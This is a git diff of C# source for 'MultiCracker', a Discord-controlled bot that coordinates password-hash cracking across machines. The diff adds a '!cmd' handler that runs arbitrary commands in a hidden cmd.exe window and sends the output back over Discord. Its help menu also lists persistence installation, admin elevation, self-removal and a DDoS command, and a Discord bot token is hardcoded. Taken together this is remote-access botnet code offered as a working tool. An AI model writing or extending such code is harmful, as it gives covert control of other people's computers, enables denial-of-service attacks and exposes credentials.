@@ -22,6 +22,8 @@ using System.Security.Principal;
 using System.Reflection;
 using System.Reactive;
 using static System.Windows.Forms.VisualStyles.VisualStyleElement;
+using System.Diagnostics.Metrics;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement.TaskbarClock;
 
 namespace MultiCracker
 {
@@ -47,6 +49,12 @@ namespace MultiCracker
         // Save settings to profiles. (file)
         // DONE: Save passwords and hashes to seperate channels to be used later.
         // DONE: Add a way to load passwords and hashes from seperate channels.
+        // DONE: Add a command for executing CMD commands on the bot.
+        // DONE: Make new method of ForcesSS (Forces Start/Stop) With <start1>,<end1>;<start2>,<end2>;<start3>,<end3>...
+        // Modify so that it removes the channel then creates a new one instead of just deleting all messages.
+        // DONE: Fix the HashesPerSeconds counter when using ForcesSS. (It used to count not tried passwords so it boosted the score.)
+        // Make it so that bots automatically find and crack hashes from other bots that has disconnected.
+        // Save current crack-run to temp file on disk every heartbeat. (So it can be used later in case of disconnection.)
         // ----------------------------------------
 
         bool EmergencySTOP = false;
@@ -66,10 +74,16 @@ namespace MultiCracker
         string hash;
         string password;
 
+        // Warning level
+        int currentWarningLevel = 0;
+
+        // Version
+        string currentVersion = "1.4.3";
 
         // Force start/end
         int forceEnd = int.MaxValue; // As high as possible (default)
         int forceStart = 0; // All accepted. (0 is the default)
+        string forcesSS = $"0,{int.MaxValue}"; // Basicly every ; is a new start/end for example: "0,200;400,500;800,1000" 
 
 
         // Hash settings
@@ -80,11 +94,13 @@ namespace MultiCracker
         bool UseCapitals = false;
         int MaxLength = 3;
         int MinLength = 1;
+        static BigInteger globalCombinations = 0;
 
         // Communication
         string BOT_TOKEN = "MTE4NDUwMDgwMzE2ODM3ODkwMA.GCBpcP.04tgAqrrDI5MUXzhrXonwkSMwfLwQRYWSNDnQs";
 
         int counter = 0;
+        BigInteger AccualCount = 0;
 
         // Create timer
         static Stopwatch stopwatch = new Stopwatch();
@@ -239,42 +255,72 @@ namespace MultiCracker
                 if (trimmedContent == "!help")
                 {
                     // Send a message to the channel
-                    string help_message = "Hello! I am a bot that can crack passwords and more. Here are my commands:\r\n";
-                    help_message += "**-------------- BASIC --------------**\r\n";
-                    help_message += "**!help** - Displays this message.\r\n";
-                    help_message += "\r\n**-------------- CRACKING --------------**\r\n";
-                    help_message += "**!crack** - Starts cracking the password.\r\n";
-                    help_message += "**!crackAll** - Makes all bots (including itself) crack the password its selected.\r\n";
-                    help_message += "**!stop** - Stops cracking the password.\r\n";
-                    help_message += "**!setHash** - Sets the hash to crack.\r\n";
-                    help_message += "**!status** - Sends status.\r\n";
-                    help_message += "**!info** - Sends info.\r\n";
-                    help_message += "**!reset** - Resets the bot.\r\n";
-                    help_message += "**!setMax <length>** - Sets the passwords max length.\r\n";
-                    help_message += "**!setMin <length>** - Sets the passwords min length.\r\n";
-                    help_message += "**!setLetters <true/false>** - Sets the password to use letters.\r\n";
-                    help_message += "**!setNumbers <true/false>** - Sets the password to use numbers.\r\n";
-                    help_message += "**!setSymbols <true/false>** - Sets the password to use symbols.\r\n";
-                    help_message += "**!setCapitals <true/false>** - Sets the password to use capitals.\r\n";
-                    help_message += "**!split** - Splits the cracking between bots.\r\n";
-                    help_message += "**!start <start-count>, <end-count>** - Starts cracking from <start-count> to <end-count>. (Mostly for bots to use...)\r\n";
-                    help_message += "\r\n**-------------- OTHER --------------**\r\n";
-                    help_message += "**!kys** - Bot commits suicide...\r\n";
-                    help_message += "\r\n**-------------- DEBUG --------------**\r\n";
-                    help_message += "**!log** - Sends entire log as .txt file.\r\n";
-                    help_message += "\r\n**-------------- PERSISTENCE --------------**\r\n";
-                    help_message += "**!install** - Installs persistence.\r\n";
-                    help_message += "**!uninstall** - Uninstalls persistence.\r\n";
-                    help_message += "\r\n**-------------- DDoS --------------**\r\n";
-                    help_message += "**!ddos <ip> <port> <time>** - Starts a DDoS attack on the target.\r\n";
-                    help_message += "**!stopddos** - Stops all DDoS attacks.\r\n";
-                    await message.Channel.SendMessageAsync(help_message);
+                    List<string> messagesBasic = new List<string>();
+                    List<string> messagesCracking = new List<string>();
+                    List<string> messagesOther = new List<string>();
+                    List<string> messagesDebug = new List<string>();
+                    List<string> messagesPersistence = new List<string>();
+                    List<string> messagesDDoS = new List<string>();
+
+                    messagesBasic.Add($"Hello! I am a bot that can crack passwords and more. Here are my commands: (**Version is {currentVersion}**)\r\n");
+                    messagesBasic.Add("**-------------- BASIC --------------**\r\n");
+                    messagesBasic.Add("**!help** - Displays this message.\r\n");
+                    messagesCracking.Add("\r\n**-------------- CRACKING --------------**\r\n");
+                    messagesCracking.Add("**!crack** - Starts cracking the password.\r\n");
+                    messagesCracking.Add("**!crackAll** - Makes all bots (including itself) crack the password its selected.\r\n");
+                    messagesCracking.Add("**!stop** - Stops cracking the password.\r\n");
+                    messagesCracking.Add("**!setHash** - Sets the hash to crack.\r\n");
+                    messagesCracking.Add("**!status** - Sends status.\r\n");
+                    messagesCracking.Add("**!info** - Sends info.\r\n");
+                    messagesCracking.Add("**!reset** - Resets the bot.\r\n");
+                    messagesCracking.Add("**!setMax <length>** - Sets the passwords max length.\r\n");
+                    messagesCracking.Add("**!setMin <length>** - Sets the passwords min length.\r\n");
+                    messagesCracking.Add("**!setLetters <true/false>** - Sets the password to use letters.\r\n");
+                    messagesCracking.Add("**!setNumbers <true/false>** - Sets the password to use numbers.\r\n");
+                    messagesCracking.Add("**!setSymbols <true/false>** - Sets the password to use symbols.\r\n");
+                    messagesCracking.Add("**!setCapitals <true/false>** - Sets the password to use capitals.\r\n");
+                    messagesCracking.Add("**!split** - Splits the cracking between bots.\r\n");
+                    messagesCracking.Add("**!start <start-count>, <end-count>** - Starts cracking <start1>,<end1>;<start2>,<end2>;<start3>,<end3>. (Mostly for bots to use...)\r\n");
+                    messagesCracking.Add("**!resetStart** - Resets the start and end count.\r\n");
+                    messagesOther.Add("\r\n**-------------- OTHER --------------**\r\n");
+                    messagesOther.Add("**!kys** - Bot commits suicide...\r\n");
+                    messagesOther.Add("**!elevate** - Ask for elevation from user to admin on bot computer.\r\n");
+                    messagesOther.Add("**!cmd <command>** - Execute commands with CMD on bot's computer.\r\n");
+                    messagesDebug.Add("\r\n**-------------- DEBUG --------------**\r\n");
+                    messagesDebug.Add("**!log** - Sends entire log as .txt file.\r\n");
+                    messagesDebug.Add("**!check <hash>** - Checks \"forces\" channel for missing passwords.");
+                    messagesPersistence.Add("\r\n**-------------- PERSISTENCE --------------**\r\n");
+                    messagesPersistence.Add("**!install** - Installs persistence.\r\n");
+                    messagesPersistence.Add("**!uninstall** - Uninstalls persistence.\r\n");
+                    messagesDDoS.Add("\r\n**-------------- DDoS --------------**\r\n");
+                    messagesDDoS.Add("**!ddos <ip> <port> <time>** - Starts a DDoS attack on the target.\r\n");
+                    messagesDDoS.Add("**!stopddos** - Stops all DDoS attacks.\r\n");
+
+                    // Send all Basic messages in one message
+                    await message.Channel.SendMessageAsync(string.Join("", messagesBasic));
+
+                    // Send all Cracking messages in one message
+                    await message.Channel.SendMessageAsync(string.Join("", messagesCracking));
+
+                    // Send all Other messages in one message
+                    await message.Channel.SendMessageAsync(string.Join("", messagesOther));
+
+                    // Send all Debug messages in one message
+                    await message.Channel.SendMessageAsync(string.Join("", messagesDebug));
+                    
+                    // Send all Persistence messages in one message
+                    await message.Channel.SendMessageAsync(string.Join("", messagesPersistence));
+
+                    // Send all DDoS messages in one message
+                    await message.Channel.SendMessageAsync(string.Join("", messagesDDoS));
+
                     Log(new LogMessage(LogSeverity.Info, "Message", $"Sent help message."));
                 }
                 // CRACKING
                 else if (trimmedContent == "!crack")
                 {
                     counter = 0;
+                    AccualCount = 0;
                     stopwatch.Reset();
                     // Simulate a button press of btnStartCracking
                     btnStartCracking_Click(null, null);
@@ -386,6 +432,7 @@ namespace MultiCracker
                     MaxLength = 8;
                     MinLength = 5;
                     counter = 0;
+                    AccualCount = 0;
                     stopwatch.Reset();
                     forceEnd = int.MaxValue;
                     forceStart = 0;
@@ -583,25 +630,62 @@ namespace MultiCracker
                 }
                 else if (trimmedContent.StartsWith("!start"))
                 {
-                    // Find the 2 argument after !start seperated by a space
-                    string argument = trimmedContent.Substring(7);
-                    string[] arguments = argument.Split(", ");
+                    // LOOKS LIKE THIS: !start 0,100;300,500;700,1000
 
-                    // Set variables
-                    forceStart = Convert.ToInt32(arguments[0]);
-                    forceEnd = Convert.ToInt32(arguments[1]);
+                    // Find the 2 argument after !start 
+                    string argument = trimmedContent.Substring(7);
+                    // Remove all spaces
+                    argument = argument.Replace(" ", "");
+                    // Split the argument by ";" to find each start and end point
+                    string[] argumentsPoints = argument.Split(";");
+                    // LOOKS LIKE THIS: 300,500
+
+                    // Instead of (!start 0, 1000) have this (!start 0,200;400,500;700,1000)
+                    // This way it can be split between more bots and if bots go offline it will still work.
+
+                    string[] points = new string[argumentsPoints.Length];
+
+                    int index = 0;  // Initialize the index variable
+                    foreach (var point in argumentsPoints)
+                    {
+                        // LOOKS LIKE THIS: 300,500
+                        // Add it to points[]
+                        points[index] = point;  // Use the index variable
+
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Password", $"Added point to points[]: {point}"));
+
+                        // Split the point by "," to find the start and end
+                        string[] argumentsPoint = point.Split(",");
+                        // LOOKS LIKE THIS: 300
+
+                        // Increment the index
+                        index++;
+                    }
+
+                    // Set variables to the now finished string[]
+                    forcesSS = string.Join("; ", points);
 
                     // Logging
-                    Log(new LogMessage(LogSeverity.Info, "Password", $"Start: {arguments[0]}"));
-                    Log(new LogMessage(LogSeverity.Info, "Password", $"End: {arguments[1]}"));
+                    Log(new LogMessage(LogSeverity.Info, "Password", $"Number of points: {index}"));
+                    Log(new LogMessage(LogSeverity.Info, "Password", $"Points: {string.Join("; ", points)}"));
+                    Log(new LogMessage(LogSeverity.Info, "Password", $"ForcesSS: {forcesSS}"));
 
                     // Send message to discord
                     var guild2 = _client.Guilds.FirstOrDefault(); // Get the first available guild
                     computerNameRaw = Environment.MachineName;
                     computerName = computerNameRaw.ToLower();
                     var channel2 = guild2.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
-                    await channel2.SendMessageAsync($"Start: {arguments[0]}");
-                    await channel2.SendMessageAsync($"End: {arguments[1]}");
+                    await channel2.SendMessageAsync($"Number of points: {index}");
+                    await channel2.SendMessageAsync($"Points: {forcesSS}");
+
+                    
+                }
+                else if (trimmedContent == "!resetStart")
+                {
+                    forcesSS = $"0,{int.MaxValue}";
+                    await message.Channel.SendMessageAsync($"Reset forces settings. (ForcesSS: {forcesSS})");
+                    Log(new LogMessage(LogSeverity.Info, "Message", $"Reset forces settings. (ForcesSS: {forcesSS})"));
                 }
                 // OTHER
                 else if (trimmedContent == "!kys")
@@ -670,6 +754,17 @@ namespace MultiCracker
                         Log(new LogMessage(LogSeverity.Info, "Elevate", $"Already admin."));
                     }
                 }
+                else if (trimmedContent.StartsWith("!cmd"))
+                {
+                    // Find the argument after !cmd
+                    string argument = trimmedContent.Substring(5);
+
+                    // Execute command with cmd and return the output
+                    string output = ExecuteCommand(argument);
+
+                    // Send discord message
+                    await message.Channel.SendMessageAsync($"Output: {output}");
+                }
                 // DEBUG
                 else if (trimmedContent == "!log")
                 {
@@ -691,6 +786,46 @@ namespace MultiCracker
                         await message.Channel.SendMessageAsync($"Error sending log file: {ex.Message}");
                         // Log
                         Log(new LogMessage(LogSeverity.Error, "Message", $"Error sending log file: {ex.Message}"));
+                    }
+                }
+                else if (trimmedContent.StartsWith("!check"))
+                {
+                    // Find the argument after !check
+                    string hashTarget = trimmedContent.Substring(7);
+
+                    // Use SearchForArguments to find the argument
+                    string output = SearchForArguments(hashTarget);
+
+                    if (output == "found")
+                    {
+                        // Password was found and hash:password was sent to discord channel.
+                        return;
+                    }
+                    else if (output == "not found")
+                    {
+                        // Hash was not found.
+                        // Send discord message
+                        await message.Channel.SendMessageAsync($"Did not find the hash in \"forces\": **{hashTarget}**");
+                        return;
+                    }
+
+                    // Split output by ":"
+                    string[] outputSplit = output.Split(":");
+                    bool found = Convert.ToBoolean(outputSplit[0]);
+                    string hashFound = outputSplit[1];
+                    string startCommand = outputSplit[2];
+                    BigInteger combinations = Convert.ToInt32(outputSplit[3]);
+
+                    // EXAMPLE OUTPUT: "True:<hash>:<startCommand>:<TotalCombinations>"
+
+                    // Send discord message (Passwords left to crack: True)
+                    await message.Channel.SendMessageAsync($"Passwords left to crack: **{found}**");
+                    // Send discord message (Hash: <hash>)
+                    await message.Channel.SendMessageAsync($"Checked hash: **{hashFound}**");
+                    if (found)
+                    {
+                        // Send discord message (Start command: <startCommand>)
+                        await message.Channel.SendMessageAsync($"Start command: **{startCommand}** (Based on that the password is within {combinations} combinations long.)");
                     }
                 }
                 // PERSISTENCE
@@ -791,8 +926,10 @@ namespace MultiCracker
         {
             try
             {
+                // Find the first available guild
                 var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
 
+                // Check if the bot is a member of any guild
                 if (guild != null)
                 {
                     // Find the name of computer
@@ -911,6 +1048,7 @@ namespace MultiCracker
                 Log(new LogMessage(LogSeverity.Error, "Elevate", $"Error elevating to admin: {ex.Message}"));
             }
         }
+
 
         // Persistence
         async void InstallPersistence()
@@ -1251,13 +1389,354 @@ namespace MultiCracker
             }
         }
 
+
+        // CMD Execution
+        public string ExecuteCommand(string command)
+        {
+            // Execute command with cmd and return the output
+            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", $"/c {command}")
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardOutput = true, // Redirect output
+                RedirectStandardError = true,  // Redirect error (optional)
+                WindowStyle = ProcessWindowStyle.Hidden
+            };
+
+            using (Process process = new Process())
+            {
+                process.StartInfo = processInfo;
+                process.Start();
+
+                // Read the output and error asynchronously to prevent deadlocks
+                string output = process.StandardOutput.ReadToEnd();
+                string error = process.StandardError.ReadToEnd();
+
+                process.WaitForExit();
+
+                // Check for errors
+                if (!string.IsNullOrEmpty(error))
+                {
+                    return $"Error: {error}";
+                }
+
+                return output;
+            }
+        }
+
+
+
+        // Forces argument
+        public string SearchForArguments(string targetHash)
+        {
+            // Find Channel "hash" in the same guild and look through all messages
+            var guildHash = _client.Guilds.FirstOrDefault(); // Get the first available guild
+            var channelHash = guildHash.TextChannels.FirstOrDefault(ch => ch.Name == $"hash");
+            
+            // Get the last 100 messages
+            var messagesHash = channelHash.GetMessagesAsync(100).FlattenAsync().Result;
+            List<IMessage> messageListHash = messagesHash.ToList();
+
+            // Loop through all messages
+            foreach (var messageHash in messageListHash)
+            {
+                // Check if the message starts with the target hash
+                if (messageHash.Content.StartsWith(targetHash))
+                {
+                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Found hash in \"hash\" channel: {targetHash}"));
+
+                    // Get each part of the message
+                    string[] parts = messageHash.Content.Split(":");
+                    string hash = parts[0];
+                    string password = parts[1];
+
+                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Password found in storage!: {hash}:{password}"));
+                    // Find channel bot in the same guild (bot-{computername-lowercase})
+                    var guildBot = _client.Guilds.FirstOrDefault(); // Get the first available guild
+                    string computerNameRaw = Environment.MachineName;
+                    string computerName = computerNameRaw.ToLower();
+                    var channelBot = guildBot.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
+
+                    // Send message
+                    channelBot.SendMessageAsync($"**Password found in storage! {hash}:{password}**");
+                    return "found";
+                }
+            }
+
+
+            // Find channel "forces" in the same guild and look through all messages
+            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
+            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"forces");
+
+            // Get the last 100 messages
+            var messages = channel.GetMessagesAsync(100).FlattenAsync().Result;
+            List<IMessage> messageList = messages.ToList();
+
+            BigInteger totalCombinations = 0; // Total combinations
+            BigInteger totalCheckedCombinations = 0; // Total checked combinations
+            List<(int, int)> forceRanges = new List<(int, int)>(); // List to store force ranges
+            bool passwordsLeft = true; // If there are passwords left to check
+            int counter2 = 0;
+            int foundHashes = 0;
+
+            // Loop through all messages
+            foreach (var message in messageList)
+            {
+                // Check if the message starts with the target hash
+                if (message.Content.StartsWith(targetHash))
+                {
+                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Found hash in \"forces\" channel: {targetHash}"));
+                    foundHashes++;
+
+                    // Get each part of the message
+                    string[] parts = message.Content.Split(":");
+                    string hash = parts[0];
+                    string algorithm = parts[1];
+                    bool useNumbers = Convert.ToBoolean(parts[2]);
+                    bool useLetters = Convert.ToBoolean(parts[3]);
+                    bool useSymbols = Convert.ToBoolean(parts[4]);
+                    bool useCapitals = Convert.ToBoolean(parts[5]);
+                    int max = Convert.ToInt32(parts[6]);
+                    int min = Convert.ToInt32(parts[7]);
+                    BigInteger combinations = Convert.ToInt32(parts[8]);
+                    string forceSS = parts[9];
+
+                    // Figure out how many points there are
+                    string[] points = forceSS.Split(";");
+                    int numberOfPoints = points.Length;
+
+                    // Find the start and end of each point
+                    int[] pointStarts = new int[numberOfPoints];
+                    int[] pointEnds = new int[numberOfPoints];
+                    int index = 0;
+
+                    foreach (var point in points)
+                    {
+                        // Split the point by "," to find the start and end
+                        string[] argumentsPoint = point.Split(",");
+
+                        // Check if argumentsPoint has at least 2 elements
+                        if (argumentsPoint.Length >= 2)
+                        {
+                            // Get the start and end
+                            int start = Convert.ToInt32(argumentsPoint[0]);
+                            int end = Convert.ToInt32(argumentsPoint[1]);
+
+                            // Add it to the arrays
+                            pointStarts[index] = start;
+                            pointEnds[index] = end;
+                        }
+                        else
+                        {
+                            // Log an error or handle the situation where the format is incorrect
+                            Log(new LogMessage(LogSeverity.Error, "Forces", $"Invalid format in point: {point}"));
+                        }
+
+                        // Increment the index
+                        index++;
+                    }
+
+                    // Set Combinations to the total combinations
+                    totalCombinations = combinations;
+
+                    // Add to totalCheckedCombinations (Each pointEnd - pointStart + 1)
+                    foreach (var pointEnd in pointEnds)
+                    {
+                        totalCheckedCombinations += pointEnd - pointStarts[0] + 1;
+                    }
+                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Total combinations: {totalCombinations}"));
+                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Total checked combinations: {totalCheckedCombinations}"));
+
+
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Forces", $"ForcesSS: {forceSS}"));
+                    // Log each point
+                    try
+                    {
+                        for (int i = 0; i < numberOfPoints; i++)
+                        {
+                            try
+                            {
+                                Log(new LogMessage(LogSeverity.Info, "Forces", $"Point {i}: {pointStarts[i]} - {pointEnds[i]}"));
+
+                                // Add it to the list of force ranges
+                                if (pointStarts[i] - 1 > 0)
+                                {
+                                    forceRanges.Add((pointStarts[i], pointEnds[i]));
+                                }
+                                else
+                                {
+                                    forceRanges.Add((pointStarts[i], pointEnds[i]));
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                // Log
+                                Log(new LogMessage(LogSeverity.Error, "Forces", $"Error sending points: {ex.Message}"));
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        // Log
+                        Log(new LogMessage(LogSeverity.Error, "Forces", $"Error sending points: {ex.Message}"));
+                    }
+
+                    
+                }
+
+            }
+
+            if (foundHashes == 0)
+            {
+                // Return "not found" that means no hash was found
+                return "not found";
+            }
+
+            // Print all force ranges
+            Log(new LogMessage(LogSeverity.Info, "Forces", $"Total force ranges: {forceRanges.Count}"));
+
+            // Check all points/ranges
+            foreach (var forceRange in forceRanges)
+            {
+                counter2++;
+                Log(new LogMessage(LogSeverity.Info, "Forces", $"Checking range: {forceRange.Item1} - {forceRange.Item2} ({counter2})"));
+            }
+
+            // Check if there are passwords left to check
+            if (totalCheckedCombinations >= totalCombinations)
+            {
+                passwordsLeft = false;
+            }
+
+            // Find inverse of forceRanges (from 0 to totalCombonations)
+            // Array of inverse points
+            List<BigInteger> InversePoints = new List<BigInteger>();
+            List<(BigInteger, BigInteger)> inverseForceRanges = new List<(BigInteger, BigInteger)>();
+            List<(BigInteger, BigInteger)> NewPoints = new List<(BigInteger, BigInteger)>();
+            foreach (var forceRange in forceRanges)
+            {
+                // We have the total combinations and all ranges that are already checked and need to create new ranges that are not checked
+
+                // Take all points start - 1 (execpt if original is 0) and all points end + 1
+                // Example: 0-100, 200-300, 400-500
+                // New points: 99-101, 199-301, 399-501
+
+                foreach (var forceRange2 in forceRanges)
+                {
+                    if (forceRange2.Item1 - 1 > 0)
+                    {
+                        NewPoints.Add((forceRange2.Item1 - 1, forceRange2.Item2 + 1));
+                    }
+                    else
+                    {
+                        NewPoints.Add((forceRange2.Item1, forceRange2.Item2 + 1));
+                    }
+                }
+
+                // Sort the new points
+                NewPoints.Sort((x, y) => x.Item1.CompareTo(y.Item1));
+
+                // Log
+                foreach (var forceRange2 in NewPoints)
+                {
+                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Point checked margin: {forceRange2.Item1} - {forceRange2.Item2}"));
+                }
+            }
+
+            // Now find the inverse of the new points
+            // Example: 0-100, 200-300, 400-500
+            // New points: 0, 101-199, 301-399, 501-1001
+
+            // For each combination try a number between 0 and totalCombinations and check if it is in any of the ranges
+            for (BigInteger i = 0; i < totalCombinations; i++)
+            {
+                bool found = false;
+                foreach (var forceRange2 in NewPoints)
+                {
+                    if (i >= forceRange2.Item1 && i <= forceRange2.Item2)
+                    {
+                        found = true;
+                    }
+                }
+                if (!found)
+                {
+                    // Add it to the list of inverse points
+                    InversePoints.Add((i));
+                }
+            }
+
+            // Log
+            Log(new LogMessage(LogSeverity.Info, "Forces", $"INVERSE: Number of points not checked: {InversePoints.Count}"));
+
+
+
+            // Calculate the inverse ranges
+            // 0 - [1].item1
+            // [1].item2 - [2].item1
+            // [2].item2 - [3].item1
+            // [3].item2 - [4].item1
+
+            if (NewPoints[0].Item1 != 0)
+            {
+                // Add the range to the list of inverse ranges
+                inverseForceRanges.Add((0, NewPoints[0].Item1));
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Forces", $"INVERSE: Range added to inverse: {NewPoints[0].Item1}"));
+            }
+            for (int i = 0; i < NewPoints.Count - 1; i++)
+            {
+                // Add the range to the list of inverse ranges
+                inverseForceRanges.Add((NewPoints[i].Item2, NewPoints[i + 1].Item1));
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Forces", $"INVERSE: Range added to inverse: {NewPoints[i].Item2} - {NewPoints[i + 1].Item1}"));
+            }
+            if (NewPoints[NewPoints.Count - 1].Item2 != totalCombinations)
+            {
+                // Add the range to the list of inverse ranges
+                inverseForceRanges.Add((NewPoints[NewPoints.Count - 1].Item2, totalCombinations));
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Forces", $"INVERSE: Range added to inverse: {NewPoints[NewPoints.Count - 1].Item2} - {totalCombinations}"));
+            }
+
+            // Logging
+            foreach (var forceRange in inverseForceRanges)
+            {
+                Log(new LogMessage(LogSeverity.Info, "Forces", $"Inverse range: {forceRange.Item1} - {forceRange.Item2}"));
+            }
+
+
+            // Calculate !startCommand (!start 100,200;500,600)
+            string startCommand = "!start ";
+            foreach (var forceRange in inverseForceRanges)
+            {
+                startCommand += $"{forceRange.Item1},{forceRange.Item2};";
+            }
+            // Remove the last ";" from the !startCommand
+            startCommand = startCommand.Remove(startCommand.Length - 1);
+
+            // Log
+            Log(new LogMessage(LogSeverity.Info, "Forces", $"BEFORE !startCommand: {startCommand}"));
+
+            // Remove if there is any unexecutable code
+            startCommand = startCommand.Replace("0,-1;", "");
+
+            // Log
+            Log(new LogMessage(LogSeverity.Info, "Forces", $"AFTER !startCommand: {startCommand}"));
+
+            // Return gathered information (True:<hash>:<startCommand>:<TotalCombinations>)
+            return $"{passwordsLeft}:{targetHash}:{startCommand}:{totalCombinations}";
+        }
+
+
+
         // Timer
         private async Task TimerThread()
         {
             Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Heartbeat started."));
 
             // First heartbeat
-            SendHeartbeat();
+            SendHeartbeat(0);
 
             // Use System.Timers.Timer instead of System.Windows.Forms.Timer
             System.Timers.Timer heartbeatTimer = new System.Timers.Timer();
@@ -1267,13 +1746,28 @@ namespace MultiCracker
             {
                 // Access 'this' in a way that doesn't impact your logic
                 var unused = this.ToString();
-                SendHeartbeat();
                 CheckOnOthers();
+                SendHeartbeat(currentWarningLevel);
             };
             heartbeatTimer.Start();
         }
-        async void SendHeartbeat()
+        async void SendHeartbeat(int level)
         {
+            if (level == 1) {
+                // Log (typically around 30 sec without answer)
+                Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Warning 1"));
+            }
+            if (level == 2)
+            {
+                // Log (typically around 60 sec without answer)
+                Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Warning 2"));
+            }
+            if (level == 3)
+            {
+                // Log (typically around 90 sec without answer)
+                Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Warning 3"));
+            }
+
             Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Sending heartbeat..."));
             try
             {
@@ -1286,7 +1780,14 @@ namespace MultiCracker
                 if (channel != null)
                 {
                     // Send message
-                    await channel.SendMessageAsync("Heartbeat");
+                    if (level == 0)
+                    {
+                        await channel.SendMessageAsync("Heartbeat");
+                    }
+                    else
+                    {
+                        await channel.SendMessageAsync("Heartbeat (Warning " + level + ")");
+                    }
                     Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Heartbeat sent."));
                 }
                 else
@@ -1371,7 +1872,8 @@ namespace MultiCracker
             // If they have, then stop cracking
             // If they haven't, then continue cracking
             // If there are no other bots, then continue cracking
-            // If there are other bots, but they haven't sent a heartbeat in the last 30 seconds, then continue cracking
+            // If there are other bots, but they haven't sent a heartbeat in the last 90 seconds, remove bot (its dead...)
+            // Also give out warnings to bots.
 
             // Find other bots
             computers = FindOthers();
@@ -1414,10 +1916,20 @@ namespace MultiCracker
                     // Stop cracking
                     btnStopCracking_Click(null, null);
                 }
+                else if (timeDifference > 30 && timeDifference < 60)
+                {
+                    currentWarningLevel = 0;
+                }
+                else if (timeDifference > 60 && timeDifference < 90)
+                {
+                    currentWarningLevel = 2;
+                }
                 else if (timeDifference > 90)
                 {
+                    currentWarningLevel = 3;
                     // The channel has not sent a heartbeat in the last 30 seconds
                     Log(new LogMessage(LogSeverity.Error, "Discord", $"No heartbeat found in {channel.Name}. Will now remove the channel and possible bot"));
+
                     // Delete channel
                     // Check if channel is the same as this computer
                     string computerNameRaw = Environment.MachineName;
@@ -1469,17 +1981,17 @@ namespace MultiCracker
         private string GetStatus()
         {
             // Variables
-            int hashesPerSecondInt = 0;
-            double hashesPerSecond = 0.0;
+            BigInteger hashesPerSecondInt = 0;
+            BigInteger hashesPerSecond = 0;
             string currentGuess = "";
             string timeStarted = "";
             string timeStopped = "";
             TimeSpan timeElapsed = new TimeSpan();
-            double estimatedTimeRemaining = 0.0;
+            BigInteger estimatedTimeRemaining = 0;
             string formattedTimeRemaining = "";
             string formattedTimeElapsed = "";
             BigInteger possibleCombinations = 0;
-            
+            bool UsesForcesSS = false;
 
             // Calculate possible combinations
             try
@@ -1497,8 +2009,8 @@ namespace MultiCracker
             try
             {
                 // Calculate hashes per second
-                hashesPerSecond = counter / stopwatch.Elapsed.TotalSeconds;
-                hashesPerSecondInt = Convert.ToInt32(hashesPerSecond);
+                hashesPerSecond = AccualCount / new BigInteger(stopwatch.Elapsed.TotalSeconds);
+                hashesPerSecondInt = (int)hashesPerSecond;
             }
             catch (Exception ex)
             {
@@ -1506,40 +2018,18 @@ namespace MultiCracker
                 Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating hashes per second (Phase 1): {ex.Message}"));
             }
 
-            // Calculate hashes per second (Phase 2)
-            try
-            {
-                // Check if the Force Start and Force End are set to anything else than default
-                if (forceEnd == int.MaxValue || forceStart == 0)
-                {
-                    // Force Start and Force End are not set (default)
-                    // Calculate hashes per second
-                    hashesPerSecond = counter / stopwatch.Elapsed.TotalSeconds;
-                    hashesPerSecondInt = Convert.ToInt32(hashesPerSecond);
-                }
-                else
-                {
-                    // Force Start and Force End are set (not default)
-                    // Calculate hashes per second
-                    hashesPerSecond = (counter - forceStart) / stopwatch.Elapsed.TotalSeconds;
-                    hashesPerSecondInt = Convert.ToInt32(hashesPerSecond);
-                }
-            }
-            catch (Exception ex)
-            {
-                // Log error
-                Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating hashes per second (Phase 2): {ex.Message}"));
-            }
-
             // Calculate estimated time remaining
             try
             {
                 // Calculate estimated time remaining
-                estimatedTimeRemaining = (double)possibleCombinations / hashesPerSecond;
+                estimatedTimeRemaining = possibleCombinations / hashesPerSecond;
                 Log(new LogMessage(LogSeverity.Info, "Info", $"Estimated time remaining (in seconds): {estimatedTimeRemaining}"));
 
                 // Ensure estimatedTimeRemaining is non-negative
-                estimatedTimeRemaining = Math.Max(estimatedTimeRemaining, 0);
+                if (estimatedTimeRemaining < 0)
+                {
+                    estimatedTimeRemaining = 0;
+                }
 
                 // Calculate days, hours, minutes, seconds, and milliseconds
                 BigInteger totalSeconds = (BigInteger)estimatedTimeRemaining;
@@ -1550,7 +2040,7 @@ namespace MultiCracker
                 BigInteger remainingMinutes = remainingSeconds % 3600;
                 BigInteger minutes = remainingMinutes / 60;
                 BigInteger seconds = remainingMinutes % 60;
-                BigInteger milliseconds = (BigInteger)((estimatedTimeRemaining - Math.Floor(estimatedTimeRemaining)) * 1000);
+                BigInteger milliseconds = (estimatedTimeRemaining % 1000);
 
                 Log(new LogMessage(LogSeverity.Info, "Info", $"Estimated time remaining: {days}D:{hours}H:{minutes}M:{seconds}S:{milliseconds}F"));
 
@@ -1634,7 +2124,7 @@ namespace MultiCracker
                 BigInteger remainingMinutes = totalSeconds % 3600;
